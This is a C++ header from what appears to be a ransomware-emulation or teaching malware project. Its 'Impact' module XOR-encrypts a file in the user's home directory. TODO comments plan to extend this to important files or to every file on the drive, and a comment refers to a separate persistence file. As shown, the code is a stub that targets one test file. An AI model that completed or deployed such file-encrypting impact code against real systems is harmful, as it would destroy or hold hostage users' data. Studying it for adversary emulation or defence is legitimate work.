#ifndef IMPACT_HPP
#define IMPACT_HPP

#include <cstdlib>

#include "../utils.hpp"

namespace Impact {
    int encrypt() {
        LOG_INFO("[IMPACT] ENCRYPT FILES")

        const char* homeEnv = std::getenv("HOME");
        if (homeEnv == nullptr) {
            LOG_ERROR("Couldn't find $HOME - unable to continue")
            return 1;
        }

        // TODO: list of important files
        // TODO: or just enumerate all files on drive and go one-by-one
        // for now encrypt .test (the same one that has persistence)
        std::string homeDir(homeEnv);
        std::string filename = ".test";
        std::string fullPath = homeDir + "/" + filename;

        if (Utils::encryptFile(fullPath)) {
            LOG_SUCCESS("[IMPACT] successfully encrypted file in path {}", fullPath)
        } else {
            LOG_ERROR("[IMACT] file couldnt be encrypted :c")
        }

        return 0;
    }

    // since we're using a XOR cypher, decrypting is identical to encrypting
    // we'll use this as a placeholder proxy for later, possibly more elaborate cyphers
    int decrypt() { 
        return encrypt();
    }
}

#endif